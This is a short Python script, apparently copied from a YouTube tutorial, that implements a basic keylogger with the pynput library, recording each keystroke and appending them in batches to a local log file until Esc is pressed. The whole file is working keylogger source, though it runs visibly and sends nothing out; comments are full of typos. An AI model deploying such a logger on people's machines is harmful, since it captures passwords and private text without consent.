# Youtube tut for "Create a keylogget with Python = Tutorial" 
# On freecodecamp.org

import pynput

from pynput.keyboard import Key, Listener

# this count variable will allow you to update the text file after so many keystrokes. 
count = 0 
keys = []

#This logs the kes that are being pressed
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10: 
        count = 0 
        write_file(keys)
        keys = []
 
 #This wrties the kys into a gile "Log.txt" us "w" to "wrtie" the file for the first time 
 # but after you need to use 'a'
def write_file(keys):
    with open("log.csv", "a") as f:
        for key in keys: 
            k = str(key).replace("'","") # This replace the quatations with nothing so you don't have a bunch of quotation marks
            if k.find("space") > 0:# Whenever you hit the space key
                f.write('\n')#       It adds new line
            elif k.find("key") == -1: 
                f.write(k)

#Thi is for exiting out of the command by using 'esc' key 
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener: 
    listener.join()

